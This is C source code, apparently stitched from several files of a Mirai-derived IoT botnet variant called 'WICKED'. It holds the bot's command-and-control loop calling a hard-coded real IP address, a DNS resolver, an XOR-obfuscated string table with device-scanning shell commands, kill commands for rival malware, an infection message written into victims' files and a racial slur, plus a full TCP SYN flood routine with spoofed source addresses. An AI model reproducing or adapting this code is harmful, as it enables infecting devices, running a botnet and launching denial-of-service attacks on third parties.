                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                    if(id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }

                    #ifdef DEBUG
                        printf("[main] connected to CNC.\n");
                    #endif
                }
            }
        }
        else if(fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 1\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            if(len == 0) // If it is just a ping, no need to try to read in buffer data
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL); // skip buffer forlength
                continue;
            }
            len = ntohs(len);
            if(len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 2\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

            #ifdef DEBUG
                printf("[main] received %d bytes from CNC\n", len);
            #endif

            if(len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    table_unlock_val(TABLE_CNC_PORT);

    srv_addr.sin_addr.s_addr = INET_ADDR(185,246,152,173);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));

    table_lock_val(TABLE_CNC_PORT);
}

static void establish_connection(void)
{
    #ifdef DEBUG
        printf("[main] attempting to connect to CNC\n");
    #endif

    if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[main] failed to call socket(). Errno = %d\n", errno);
        #endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if(resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
    #ifdef DEBUG
        printf("[main] tearing down connection to CNC!\n");
    #endif

    if(fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
    sleep(1);
}
#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>

#include "includes.h"
#include "resolv.h"
#include "util.h"
#include "rand.h"
#include "protocol.h"

void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
{
    int len = util_strlen(src_domain) + 1;
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    uint8_t curr_len = 0;

    while (len-- > 0)
    {
        char c = *src_domain++;

        if (c == '.' || c == 0)
        {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else
        {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *dst_pos = 0;
}

static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
{
    unsigned int jumped = 0, offset;
    *count = 1;
    while(*reader != 0)
    {
        if(*reader >= 192)
        {
            offset = (*reader)*256 + *(reader+1) - 49152;
            reader = buffer + offset - 1;
            jumped = 1;
        }
        reader = reader+1;
        if(jumped == 0)
            *count = *count + 1;
    }

    if(jumped == 1)
        *count = *count + 1;
}

struct resolv_entries *resolv_lookup(char *domain)
{
    struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries));
    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    resolv_domain_to_hostname(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
    struct sockaddr_in addr = {0};
    int query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint16_t dns_id = rand_next() % 0xffff;

    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    // Set up the dns query
    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8); // Recursion desired
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    while (tries++ < 5)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            close(fd);
        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to create socket\n");
#endif
            sleep(1);
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to call connect on udp socket\n");
#endif
            sleep(1);
            continue;
        }

        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to send packet: %d\n", errno);
#endif
            sleep(1);
            continue;
        }

        fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1)
        {
#ifdef DEBUG
            printf("[resolv] select() failed\n");
#endif
            break;
        }
        else if (nfds == 0)
        {
#ifdef DEBUG
            printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
#endif
            continue;
        }
        else if (FD_ISSET(fd, &fdset))
        {
#ifdef DEBUG
            printf("[resolv] Got response from select\n");
#endif
            int ret = recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;

            if (ret < (sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question)))
                continue;

            dnsh = (struct dnshdr *)response;
            qname = (char *)(dnsh + 1);
            dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
            name = (char *)(dnst + 1);

            if (dnsh->id != dns_id)
                continue;
            if (dnsh->ancount == 0)
                continue;

            ancount = ntohs(dnsh->ancount);
            while (ancount-- > 0)
            {
                struct dns_resource *r_data = NULL;

                resolv_skip_name(name, response, &stop);
                name = name + stop;

                r_data = (struct dns_resource *)name;
                name = name + sizeof(struct dns_resource);

                if (r_data->type == htons(PROTO_DNS_QTYPE_A) && r_data->_class == htons(PROTO_DNS_QCLASS_IP))
                {
                    if (ntohs(r_data->data_len) == 4)
                    {
                        uint32_t *p;
                        uint8_t tmp_buf[4];
                        for(i = 0; i < 4; i++)
                            tmp_buf[i] = name[i];

                        p = (uint32_t *)tmp_buf;

                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                        entries->addrs[entries->addrs_len++] = (*p);
#ifdef DEBUG
                        printf("[resolv] Found IP address: %08x\n", (*p));
#endif
                    }

                    name = name + ntohs(r_data->data_len);
                } else {
                    resolv_skip_name(name, response, &stop);
                    name = name + stop;
                }
            }
        }

        break;
    }

    close(fd);

#ifdef DEBUG
    printf("Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
#endif

    if (entries->addrs_len > 0)
        return entries;
    else
    {
        resolv_entries_free(entries);
        return NULL;
    }
}

void resolv_entries_free(struct resolv_entries *entries)
{
    if (entries == NULL)
        return;
    if (entries->addrs != NULL)
        free(entries->addrs);
    free(entries);
}

#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0x1337c0d3;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_PORT, "\x22\x84", 2); // 5555
    add_entry(TABLE_SCAN_CB_PORT, "\x75\x43", 2); // 17012
    add_entry(TABLE_EXEC_SUCCESS, "\x78\x5F\x17\x40\x52\x5B\x5B\x19\x19\x19\x37", 11); // Oh well...

    add_entry(TABLE_SCAN_SHELL, "\x44\x5F\x52\x5B\x5B\x37", 6); // shell
    add_entry(TABLE_SCAN_ENABLE, "\x52\x59\x56\x55\x5B\x52\x37", 7); // enable
    add_entry(TABLE_SCAN_SYSTEM, "\x44\x4E\x44\x43\x52\x5A\x37", 7); // system
    add_entry(TABLE_SCAN_SH, "\x64\x7F\x37", 3); // sh
    add_entry(TABLE_SCAN_QUERY, "\x18\x55\x5E\x59\x18\x55\x42\x44\x4E\x55\x58\x4F\x17\x60\x7E\x74\x7C\x72\x73\x37", 20); // /bin/busybox WICKED
    add_entry(TABLE_SCAN_RESP, "\x60\x7E\x74\x7C\x72\x73\x0D\x17\x56\x47\x47\x5B\x52\x43\x17\x59\x58\x43\x17\x51\x58\x42\x59\x53\x37", 25); // WICKED: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x59\x54\x58\x45\x45\x52\x54\x43\x37", 9); // ncorrect
    add_entry(TABLE_SCAN_PS, "\x18\x55\x5E\x59\x18\x55\x42\x44\x4E\x55\x58\x4F\x17\x47\x44\x37", 16); // /bin/busybox ps
    add_entry(TABLE_SCAN_KILL_9, "\x18\x55\x5E\x59\x18\x55\x42\x44\x4E\x55\x58\x4F\x17\x5C\x5E\x5B\x5B\x17\x1A\x0E\x37", 22); // /bin/busybox kill -9
    add_entry(TABLE_SCAN_OGIN, "\x58\x50\x5E\x59\x37", 5); // ogin
    add_entry(TABLE_SCAN_ENTER, "\x52\x59\x43\x52\x45\x37", 6); // enter
    add_entry(TABLE_SCAN_ASSWORD, "\x56\x44\x44\x40\x58\x45\x53\x37", 8); // assword
	
    add_entry(TABLE_KILLER_PROC, "\x18\x47\x45\x58\x54\x18\x37", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x18\x52\x4F\x52\x37", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x18\x51\x53\x37", 4); // /fd
    add_entry(TABLE_KILLER_MAPS, "\x18\x5A\x56\x47\x44\x37", 6); // /maps
    add_entry(TABLE_KILLER_TCP, "\x18\x47\x45\x58\x54\x18\x59\x52\x43\x18\x43\x54\x47\x37", 14); // /proc/net/tcp

    add_entry(TABLE_EXEC_MIRAI, "\x53\x41\x45\x7F\x52\x5B\x47\x52\x45\x37", 10); // dvrHelper
    add_entry(TABLE_EXEC_SORA1, "\x79\x5E\x70\x70\x52\x65\x01\x0E\x4F\x53\x37", 11); // NiGGeR69xd
    add_entry(TABLE_EXEC_SORA2, "\x06\x04\x04\x00\x64\x58\x45\x56\x7B\x78\x76\x73\x72\x65\x37", 15); // 1337SoraLOADER
    add_entry(TABLE_EXEC_OWARI, "\x6F\x06\x0E\x7E\x05\x04\x0E\x06\x05\x03\x62\x7E\x62\x37", 14); // X19I239124UIU
    add_entry(TABLE_EXEC_JOSHO, "\x06\x03\x71\x56\x37", 5); // 14Fa
    add_entry(TABLE_EXEC_APOLLO, "\x54\x54\x76\x73\x37", 5); // ccAD

    add_entry(TABLE_IOCTL_KEEPALIVE1, "\x18\x53\x52\x41\x18\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 14); // /dev/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE2, "\x18\x53\x52\x41\x18\x5A\x5E\x44\x54\x18\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 19); // /dev/misc/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE3, "\x18\x53\x52\x41\x18\x71\x63\x60\x73\x63\x06\x07\x06\x68\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 23); // /dev/FTWDT101_watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE4, "\x18\x53\x52\x41\x18\x71\x63\x60\x73\x63\x06\x07\x06\x6B\x17\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 24); // /dev/FTWDT101\ watchdog
	
    add_entry(TABLE_TEXT_TMP, "\x52\x54\x5F\x58\x17\x10\xF5\x98\x6B\x68\x1F\xD4\xB4\xB3\x1E\x68\x18\xF5\x98\x17\x78\x5F\x17\x5F\x52\x4E\x17\x43\x5F\x52\x45\x52\x19\x19\x19\x17\x7B\x58\x58\x5C\x44\x17\x5B\x5E\x5C\x52\x17\x7E\x17\x5A\x5E\x50\x5F\x43\x17\x58\x51\x17\x5E\x59\x52\x54\x43\x52\x53\x17\x4E\x58\x42\x45\x17\x53\x52\x41\x5E\x54\x52\x19\x10\x17\x09\x09\x17\x18\x43\x5A\x47\x18\x40\x5E\x54\x5C\x52\x53\x19\x43\x4F\x43\x37", 99); // echo '¯\_(ツ)_/¯ Oh hey there... Looks like I might of inected your device.' >> /tmp/wicked.txt
    add_entry(TABLE_TEXT_NODIR, "\x52\x54\x5F\x58\x17\x10\xF5\x98\x6B\x68\x1F\xD4\xB4\xB3\x1E\x68\x18\xF5\x98\x17\x78\x5F\x17\x5F\x52\x4E\x17\x43\x5F\x52\x45\x52\x19\x19\x19\x17\x7B\x58\x58\x5C\x44\x17\x5B\x5E\x5C\x52\x17\x7E\x17\x5A\x5E\x50\x5F\x43\x17\x58\x51\x17\x5E\x59\x52\x54\x43\x52\x53\x17\x4E\x58\x42\x45\x17\x53\x52\x41\x5E\x54\x52\x19\x10\x17\x09\x09\x17\x18\x40\x5E\x54\x5C\x52\x53\x19\x43\x4F\x43\x37", 95); // echo '¯\_(ツ)_/¯ Oh hey there... Looks like I might of inected your device.' >> /wicked.txt
    add_entry(TABLE_TEXT_ROOT, "\x52\x54\x5F\x58\x17\x10\xF5\x98\x6B\x68\x1F\xD4\xB4\xB3\x1E\x68\x18\xF5\x98\x17\x78\x5F\x17\x5F\x52\x4E\x17\x43\x5F\x52\x45\x52\x19\x19\x19\x17\x7B\x58\x58\x5C\x44\x17\x5B\x5E\x5C\x52\x17\x7E\x17\x5A\x5E\x50\x5F\x43\x17\x58\x51\x17\x5E\x59\x52\x54\x43\x52\x53\x17\x4E\x58\x42\x45\x17\x53\x52\x41\x5E\x54\x52\x19\x10\x17\x09\x09\x17\x18\x45\x58\x58\x43\x18\x40\x5E\x54\x5C\x52\x53\x19\x43\x4F\x43\x37", 100); // echo '¯\_(ツ)_/¯ Oh hey there... Looks like I might of inected your device.' >> /root/wicked.txt
    add_entry(TABLE_TEXT_HOME, "\x52\x54\x5F\x58\x17\x10\xF5\x98\x6B\x68\x1F\xD4\xB4\xB3\x1E\x68\x18\xF5\x98\x17\x78\x5F\x17\x5F\x52\x4E\x17\x43\x5F\x52\x45\x52\x19\x19\x19\x17\x7B\x58\x58\x5C\x44\x17\x5B\x5E\x5C\x52\x17\x7E\x17\x5A\x5E\x50\x5F\x43\x17\x58\x51\x17\x5E\x59\x52\x54\x43\x52\x53\x17\x4E\x58\x42\x45\x17\x53\x52\x41\x5E\x54\x52\x19\x10\x17\x09\x09\x17\x18\x5F\x58\x5A\x52\x18\x40\x5E\x54\x5C\x52\x53\x19\x43\x4F\x43\x37", 100); // echo '¯\_(ツ)_/¯ Oh hey there... Looks like I might of inected your device.' >> /home/wicked.txt
	
    add_entry(TABLE_RANDOM, "\x4D\x71\x71\x64\x0E\x4E\x55\x59\x07\x74\x54\x5A\x56\x01\x59\x74\x7A\x0E\x05\x60\x5F\x7B\x6D\x7E\x40\x50\x76\x5A\x6D\x43\x7F\x0F\x46\x60\x4D\x06\x41\x41\x63\x70\x7D\x7F\x7D\x43\x72\x62\x04\x5B\x73\x0F\x00\x54\x7E\x61\x6F\x65\x01\x7A\x7A\x0E\x5A\x07\x0F\x67\x37", 65); // zFFS9ybn0Ccma6nCM92WhLZIwgAmZtH8qWz1vvTGJHJtEU3lD87cIVXR6MM9m08P
	
	add_entry(TABLE_ATK_VSE, "\x63\x64\x58\x42\x45\x54\x52\x17\x72\x59\x50\x5E\x59\x52\x17\x66\x42\x52\x45\x4E\x37", 21); // TSource Engine Query
    add_entry(TABLE_ATK_RESOLVER, "\x18\x52\x43\x54\x18\x45\x52\x44\x58\x5B\x41\x19\x54\x58\x59\x51\x37", 17); // /etc/resolv.conf
    add_entry(TABLE_ATK_NSERV, "\x59\x56\x5A\x52\x44\x52\x45\x41\x52\x45\x37", 11); // nameserver
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(!val->locked)
        {
            printf("[table] Tried to double-unlock value %d\n", id);
            return;
        }
    #endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to double-lock value\n");
            return;
        }
    #endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to access table.%d but it is locked\n", id);
            return NULL;
        }
    #endif

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}

#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <fcntl.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"

void attack_tcp_syn(int duration, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    #ifdef DEBUG
        printf("[attack] In syn\n");
        return;
    #endif
    int i = 0, fd = 0;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int time_end = time(NULL) + duration;

    if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        #ifdef DEBUG
            printf("[attack] failed to create raw socket. Aborting attack\n");
        #endif
        return;
    }
    
    i = 1;
    if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        #ifdef DEBUG
            printf("[attack] failed to set IP_HDRINCL. Aborting\n");
        #endif
        close(fd);
        return;
    }

    for(i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;

        pkts[i] = calloc(128, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts = (uint8_t *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if(dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;

        *opts++ = PROTO_TCP_OPT_MSS;
        *opts++ = 4;
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof(uint16_t);

        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;

        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof(uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof(uint32_t);

        *opts++ = 1;

        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6;
    }

    while(TRUE)
    {
        for(i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

            if(targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if(source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if(ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if(sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if(dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if(seq == 0xffff)
                tcph->seq = rand_next();
            if(ack == 0xffff)
                tcph->ack_seq = rand_next();
            if(urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + 20);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        
        if(time(NULL) > time_end)
            break;
    }
}

